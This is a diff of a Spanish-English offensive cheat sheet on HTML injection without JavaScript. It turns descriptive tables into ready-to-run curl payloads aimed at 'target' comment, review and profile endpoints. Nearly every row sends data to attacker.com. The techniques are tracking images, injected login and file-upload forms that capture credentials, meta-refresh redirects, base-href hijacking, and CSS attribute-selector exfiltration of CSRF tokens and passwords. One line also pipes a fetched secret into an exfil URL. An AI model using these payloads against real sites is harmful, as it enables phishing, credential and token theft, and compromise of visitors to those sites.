@@ -24,16 +24,16 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `<img src="https://attacker/log">` | Browser fetches URL → Referer header reveals current page URL | Standard. |
-| `<img src="//attacker/log">` | Protocol-relative — same | Same. |
-| `<img src="https://attacker/?d=...">` | Encode data in URL via app-side concat | Stored data leak. |
-| `<img src="https://attacker/" lazy="loading">` | Lazy-loaded image | Stealth. |
-| Background image CSS | `<div style="background:url(https://attacker/log)"></div>` | Same effect. |
-| Multiple images en bulk | Hundreds of img tags → DDoS analytics | Heavy. |
-| Combine con sensitive URL | Sensitive token in URL → Referer leaks to atacante | Common. |
-| GIF poll | `<img src="//attacker/gif" />` con response polling | Persistent. |
-| Conditional GIF (CSS) | `:hover` triggers image load only on user hover | Tracking. |
-| Email tracking pixel | Same vector en HTML email | Standard email tracking. |
+| `curl -X POST -d 'comment=<img src="https://attacker.com/log">' https://target/comments` | Browser fetch → Referer header reveals page URL | Standard Referer leak. |
+| `curl -X POST -d 'comment=<img src="//attacker.com/log">' https://target/comments` | Protocol-relative URL exfil | Same. |
+| `curl 'https://target/reset?token=$TOKEN&msg=<img src=https://attacker.com/log>'` | Reflected — Referer leaks token-bearing URL | Sensitive URL leak. |
+| `curl -X POST -d 'comment=<div style="background:url(https://attacker.com/log)"></div>' https://target/comments` | CSS background-image exfil | CSS img-src equivalent. |
+| `curl -X POST -d 'comment=<img src="https://attacker.com/log" loading="lazy">' https://target/comments` | Lazy-loaded image stealth | Below-fold stealth. |
+| `for i in {1..100}; do curl -X POST -d "comment=<img src=https://attacker.com/log?id=$i>" https://target/comments; done` | Bulk pixel storm analytics | Volume. |
+| `curl -X POST -d 'comment=<style>.target:hover{background:url(//attacker.com/hover)}</style>' https://target/comments` | Hover-triggered tracker | UX-triggered. |
+| `curl -X POST -d 'comment=<img srcset="https://attacker.com/log?dpr=1 1x, https://attacker.com/log?dpr=2 2x">' https://target/comments` | srcset DPR-aware tracker | Multi-resolution. |
+| `curl -X POST -d 'comment=<picture><source srcset="https://attacker.com/track" media="(min-width:1px)"><img src="x"></picture>' https://target/comments` | Picture media-query trigger | Responsive trigger. |
+| `<img src="https://attacker.com/poll?t=$(date +%s)">` injection per minute (cron-fed) | Poll-style persistent tracker | Persistent tracker. |
 ^htmli-noscript-image
 
 ___
@@ -42,15 +42,15 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Form action external | `<form action="https://attacker/log">` overrides ANY parent form | Form override. |
-| Auto-submit no script | `<form action="..."><input type="submit"></form>` requires user click | Manual. |
-| Hidden inputs en visible form | Insert `<input type="hidden" name="malicious" value="x">` in legit form context | Form pollution. |
-| Append form action | If reflected ANTES de existing form's `<form>` tag, atacante's form wins | Order matters. |
-| Replace existing form action | Inject CSS/HTML to override visual form | Stealth. |
-| Form button label override | `<input type="submit" value="LOGIN">` con malicious action | Standard phishing. |
-| ImageButton form | `<input type="image" src="legit.png" formaction="//attacker">` | Image-disguised submit. |
-| Multipart form | Force file upload to attacker | If file fields present. |
-| Form `target` | `<form target="_blank" action="...">` opens new tab | UX-aware phish. |
+| `curl -X POST -d 'comment=<form action="https://attacker.com/log" method="POST"><input name="user"><input name="pass" type="password"><button>Login</button></form>' https://target/comments` | Form action external — captures submission | Form override. |
+| `curl 'https://target/?q=<input name="creditcard" type="hidden" value="malicious">'` (inside legit form) | Hidden input pollution en existing form | Form pollution. |
+| `curl -X POST -d 'desc=<form action="//attacker">... before <form action="/legit">' https://target/x` | Position-first attacker form wins | Order matters. |
+| `curl -X POST -d 'review=<input type="submit" value="Login" formaction="//attacker.com">' https://target/reviews` | Form override via formaction attribute | HTML5 formaction. |
+| `curl -X POST -d 'review=<input type="image" src="legit.png" formaction="//attacker.com">' https://target/reviews` | Image-disguised submit hijack | Image submit. |
+| `curl -X POST -d 'review=<form action="//attacker" enctype="multipart/form-data" method=POST><input type=file name=f><input type=submit></form>' https://target/reviews` | Force file upload to attacker | File harvest. |
+| `curl -X POST -d 'review=<form action="//attacker" target="_blank"><input name=p type=password><button>Submit</button></form>' https://target/reviews` | New-tab phish form | UX-aware. |
+| `curl 'https://target/?p=<button form="legit-form" formaction="//attacker">Submit</button>'` | HTML5 button-form ownership | HTML5 ownership. |
+| `curl -X POST -d 'comment=<input form="legit-form" name="redirect" value="//attacker">' https://target/comments` | Cross-context input ownership | Cross-form ownership. |
 ^htmli-noscript-form
 
 ___
@@ -59,15 +59,16 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Auto-redirect | `<meta http-equiv="refresh" content="0;url=https://attacker">` | Page reloads to attacker. |
-| Delayed redirect | `<meta http-equiv="refresh" content="5;url=...">` | 5 sec delay. |
-| Conditional refresh con cookie | `content="X;url=//attacker?c=document.cookie"` | NO funciona — meta refresh no JS. |
-| Refresh con DataURI | `content="0;url=data:text/html,<script>...</script>"` | Data URL — but blocked en modern browsers. |
-| Refresh con `javascript:` | `content="0;url=javascript:alert(1)"` | Blocked en modern browsers. |
-| Combine con location | If `<head>` controlled, multiple refresh layers | Edge. |
-| Refresh in body (most browsers ignore) | Some still respect | Edge. |
-| Loop refresh | `content="1;url=current_page"` con same URL | DoS / persistent. |
-| Refresh with fragment | `url=https://target.com#malicious` | Anchor manipulation. |
+| `curl 'https://target/?msg=<meta http-equiv="refresh" content="0;url=https://attacker.com">'` | Instant auto-redirect | Head/body reflected. |
+| `curl 'https://target/?msg=<meta http-equiv="refresh" content="5;url=https://attacker.com">'` | 5s delayed redirect | Stealth. |
+| `curl 'https://target/?msg=<meta http-equiv="refresh" content="1;url=current_page">'` | Refresh loop DoS | DoS/persist. |
+| `curl 'https://target/?msg=<meta http-equiv="refresh" content="0;url=https://target.com#malicious">'` | Fragment manipulation | Anchor abuse. |
+| `curl 'https://target/?msg=<meta http-equiv="refresh" content="0;url=//attacker.com">'` | Protocol-relative redirect | Same effect. |
+| `curl 'https://target/?msg=<meta http-equiv="set-cookie" content="session=ATTACKER_SID">'` (some browsers) | Cookie-set via meta (legacy) | Legacy browsers. |
+| `curl 'https://target/?msg=<meta charset="utf-7">'` (charset injection) | Charset injection — UTF-7 XSS combo | Charset confusion. |
+| `curl 'https://target/?msg=<meta name="referrer" content="unsafe-url">'` | Force Referer reveal full URL | Referer config override. |
+| `curl 'https://target/?msg=<meta http-equiv="Content-Security-Policy" content="default-src *">'` | CSP override loosen | CSP weaken (if respected). |
+| `curl 'https://target/?msg=<meta http-equiv="refresh" content="3;url=https://attacker.com/?d=$(curl -s https://target/secret \| base64)">'` | Combine con server-side fetch + exfil | Multi-stage. |
 ^htmli-noscript-meta
 
 ___
@@ -76,16 +77,15 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Inject base href | `<base href="https://attacker.com/">` | All relative URLs en page rerouted. |
-| All `<img src="legit.png">` | Now load from `https://attacker.com/legit.png` | Asset hijacking. |
-| All `<a href="page2">` | Now point to `https://attacker.com/page2` | Link hijacking. |
-| Form action relative | `<form action="/api/transfer">` posts to attacker | CSRF via base href. |
-| Link rel canonical | If atacante's domain becomes canonical, SEO impact | SEO trick. |
-| CSS / JS rerouting | `<link rel="stylesheet" href="style.css">` loads attacker's CSS | Style poisoning. |
-| Subresource integrity ignore | Some apps don't enforce SRI | Combined attack. |
-| Image-only base | Browsers respect first `<base>` only | Position matters. |
-| Combined con existing legit base | Atacante's base placed before original | Order trick. |
-| Base URL with subpath | `<base href="https://attacker.com/legit/">` | Mimics legit path. |
+| `curl 'https://target/?msg=<base href="https://attacker.com/">'` | Reroute all relative URLs to attacker | Head/body reflected. |
+| `curl -X POST -d 'profile=<base href="https://attacker.com/">' https://target/profile` | Stored base href hijack | Persistent asset hijack. |
+| `curl 'https://target/?msg=<base href="https://attacker.com/legit/">'` | Base con subpath mimics structure | Mimic. |
+| `curl 'https://target/?msg=<base target="_blank">'` | All relative links open new tab | UX modification. |
+| `curl 'https://target/?msg=<base href="https://attacker.com/">'` (head context placed before legit base) | First base wins — atacante base used | Position matters. |
+| `curl 'https://target/?msg=<base href="//attacker.com/">'` | Protocol-relative base | Same effect. |
+| `curl 'https://target/?msg=<base href="https://attacker.com/"><form action="/login"></form>'` (inline post-base) | Form action relative resolves to attacker | Form CSRF. |
+| `curl 'https://target/?msg=<base href="https://attacker.com/"><link rel="stylesheet" href="theme.css">'` | Style poisoning via base | CSS poison. |
+| `curl 'https://target/?msg=<base href="data:text/html,<script>alert(1)</script>">'` (some browsers) | data: scheme base edge | Edge browser. |
 ^htmli-noscript-base
 
 ### PoC base href hijack
@@ -94,11 +94,11 @@ ___
 <!-- Legit page renders this in body después de input reflejado -->
 <base href="https://attacker.com/">
 
-<!-- Now original page contiene: -->
-<img src="logo.png">           ← carga de attacker.com/logo.png
-<a href="/admin">Admin</a>     ← apunta a attacker.com/admin
-<form action="/api/transfer">  ← submits to attacker
-<link rel="stylesheet" href="theme.css">  ← loads attacker's CSS
+<!-- Now original page contains: -->
+<img src="logo.png">           <!-- carga de attacker.com/logo.png -->
+<a href="/admin">Admin</a>     <!-- apunta a attacker.com/admin -->
+<form action="/api/transfer">  <!-- submits to attacker -->
+<link rel="stylesheet" href="theme.css">  <!-- loads attacker CSS -->
 ```
 
 ___
@@ -107,17 +107,18 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `<link rel="stylesheet" href="https://attacker/style.css">` | Loads attacker's CSS | Style override. |
-| `<link rel="canonical" href="https://attacker">` | SEO canonical hijack | Search engine impact. |
-| `<link rel="dns-prefetch" href="//attacker">` | DNS prefetch | Recon. |
-| `<link rel="preconnect" href="//attacker">` | TCP+TLS preconnect | Same. |
-| `<link rel="preload" href="..." as="...">` | Force resource load | Bandwidth abuse. |
-| `<link rel="prefetch" href="...">` | Prefetch document | Cache poisoning. |
-| `<link rel="prerender" href="...">` (deprecated) | Render off-screen | Privacy. |
-| `<link rel="manifest" href="...">` | PWA manifest | Mobile-specific. |
-| `<link rel="alternate" hreflang="en" href="...">` | Alt language redirect | i18n abuse. |
-| `<link rel="amphtml" href="...">` | AMP version pointer | Google AMP abuse. |
-| `<link rel="icon" href="//attacker/favicon">` | Custom favicon | Brand spoofing. |
+| `curl 'https://target/?head=<link rel="stylesheet" href="https://attacker.com/style.css">'` | External CSS poison | Style hijack. |
+| `curl 'https://target/?head=<link rel="canonical" href="https://attacker.com/">'` | SEO canonical hijack | SEO impact. |
+| `curl 'https://target/?head=<link rel="dns-prefetch" href="//attacker.com">'` | DNS prefetch — IP/hostname recon | Recon-side-channel. |
+| `curl 'https://target/?head=<link rel="preconnect" href="//attacker.com">'` | TCP+TLS preconnect | Pre-connect leak. |
+| `curl 'https://target/?head=<link rel="preload" href="//attacker.com/x" as="script">'` | Force resource preload | Bandwidth abuse. |
+| `curl 'https://target/?head=<link rel="prefetch" href="//attacker.com/doc">'` | Document prefetch | Cache abuse. |
+| `curl 'https://target/?head=<link rel="prerender" href="//attacker.com/doc">'` (deprecated) | Render off-screen | Privacy. |
+| `curl 'https://target/?head=<link rel="manifest" href="//attacker.com/manifest.json">'` | PWA manifest hijack | Mobile PWA. |
+| `curl 'https://target/?head=<link rel="alternate" hreflang="en" href="https://attacker.com/">'` | Hreflang i18n hijack | Multi-language. |
+| `curl 'https://target/?head=<link rel="amphtml" href="https://attacker.com/amp">'` | AMP version hijack | Google AMP abuse. |
+| `curl 'https://target/?head=<link rel="icon" href="//attacker.com/favicon.ico">'` | Favicon brand spoof | Brand spoof. |
+| `curl 'https://target/?head=<link rel="search" type="application/opensearchdescription+xml" href="//attacker.com/o.xml">'` | OpenSearch hijack | Browser search engine. |
 ^htmli-noscript-linkrel
 
 ___
@@ -126,28 +127,27 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| External CSS injection | `<link rel="stylesheet" href="https://attacker">` | Atacante controls all styling. |
-| Inline style | `<div style="background:url(//attacker/log)">` | Single element style. |
-| Style tag | `<style>body { background: url(//attacker); }</style>` | Page-wide style. |
-| CSS exfil via `attribute selectors` | `input[value^="a"] { background: url(//attacker/?c=a); }` | Char-by-char data exfil. |
-| Conditional CSS | `:hover`, `:focus`, `:checked` triggers | UX-conditional exfil. |
-| CSS-only keyloggers | Combination of attribute selectors + image | Limited to first char usually. |
-| CSP bypass | CSS doesn't trigger script-src | Bypass CSP often. |
-| CSS injection en attribute | `style="...; background:url(//attacker);..."` | Attribute context. |
-| CSS variables abuse | Override `--theme-color` with malicious | Modern. |
-| Animation timing exfil | CSS animation triggers external load | Timing-based. |
-| Print stylesheet abuse | `@media print { ... }` | Print-only attack. |
-| Combined con HTML form | CSS positions fake form | Phishing prep. |
+| `curl -X POST -d 'comment=<link rel="stylesheet" href="https://attacker.com/style.css">' https://target/comments` | External CSS — attacker controls all styling | Style override. |
+| `curl -X POST -d 'comment=<style>body{background:url("https://attacker.com/log")}</style>' https://target/comments` | Page-wide style with exfil | Page poisoning. |
+| `curl -X POST -d 'comment=<style>input[name=csrf_token][value^="a"]{background:url("//attacker.com/?c=a")}input[name=csrf_token][value^="b"]{background:url("//attacker.com/?c=b")}</style>' https://target/comments` | CSS attribute selector char-by-char exfil | CSS keylogger. |
+| `curl -X POST -d 'comment=<style>input:focus{background:url("//attacker.com/?focused=1")}</style>' https://target/comments` | Focus tracker CSS | UX-conditional. |
+| `curl -X POST -d 'comment=<style>:checked + label{background:url("//attacker.com/?checked")}</style>' https://target/comments` | Checked state tracker | Form state exfil. |
+| `curl -X POST -d 'comment=<style>@media print{body{background:url("//attacker.com/printed")}}</style>' https://target/comments` | Print-only exfil | Print-trigger. |
+| `curl -X POST -d 'comment=<style>:root{--theme:url("https://attacker.com/var")}body{background:var(--theme)}</style>' https://target/comments` | CSS variable override | Modern CSS. |
+| `curl -X POST -d 'comment=<style>body{animation:e 1s infinite}@keyframes e{from{background:url("//attacker.com/poll")}}</style>' https://target/comments` | CSS animation poll | Timing-based. |
+| `curl -X POST -d 'comment=<style>@import url("https://attacker.com/poison.css")</style>' https://target/comments` | CSS @import chain | Style chain. |
+| `curl 'https://target/?style=color:red;background:url(//attacker.com/log)'` (style attribute injection) | Attribute style inject | Attribute context. |
+| `<style>input[name="password"][value="a"]~*{background:url(//attacker/?c=a)}</style>` (sibling selector) | Sibling-based exfil for password fields | Password exfil. |
 ^htmli-noscript-css
 
 ### CSS exfil via attribute selectors PoC
 
 ```html
 <style>
-  input[value^="a"] { background: url(//attacker/?c=a); }
-  input[value^="b"] { background: url(//attacker/?c=b); }
-  ... (continue for all chars)
-  input[value^="z"] { background: url(//attacker/?c=z); }
+  input[value^="a"] { background: url(//attacker.com/?c=a); }
+  input[value^="b"] { background: url(//attacker.com/?c=b); }
+  /* ... continue for all chars ... */
+  input[value^="z"] { background: url(//attacker.com/?c=z); }
 </style>
 
 <!-- Si app render: <input value="USER_DATA">
@@ -155,6 +155,6 @@ ___
      Browser fetches → atacante recibe primer char of value -->
 ```
 
-Char-by-char exfiltration of input values (CSRF token, password de browser autofill) sin JS.
+Char-by-char exfiltration de input values (CSRF token, password de browser autofill) sin JS.
 
 ***
